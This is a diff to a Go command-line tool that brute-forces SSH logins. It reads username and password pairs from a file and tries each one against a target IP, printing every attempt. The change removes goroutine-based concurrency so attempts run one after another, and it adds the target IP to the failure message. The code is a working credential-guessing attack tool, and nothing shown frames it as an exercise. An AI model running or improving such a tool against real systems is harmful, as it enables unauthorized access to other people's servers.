@@ -6,19 +6,13 @@ import (
     "io/ioutil"
     "strings"
     "os"
-    "sync"
     "golang.org/x/crypto/ssh"
 )
 
 func main() {
     ip := flag.String("ip", "127.0.0.1:22", "IP and port for SSH login")
     userpassFile := flag.String("up" , "ssh-username-password.txt","File containing usernames & passwords")
-    thread := flag.Int("t", 5, "number of threads to use")
     flag.Parse()
-
-    // WaitGroup to wait for all goroutines to finish
-    var wg sync.WaitGroup
-    wg.Add(*thread)
 
     // Open the file
     file, err := ioutil.ReadFile(*userpassFile)
@@ -46,10 +40,8 @@ func main() {
             },
             HostKeyCallback: ssh.InsecureIgnoreHostKey(),
         }
-
-        // Launch a goroutine for each password
-        go func() {
-            defer wg.Done()
+        
+        func() {
 
             // Print "Trying password"
             fmt.Printf("Trying %s:%s\n",username,password)
@@ -64,10 +56,8 @@ func main() {
             }
         }()
     }
-    // Wait for all goroutines to finish
-    wg.Wait()
 
     if !found {
-        fmt.Println("Password Not Found")
+        fmt.Printf("Password Not Found with ip:%s\n",*ip)
     }
 }
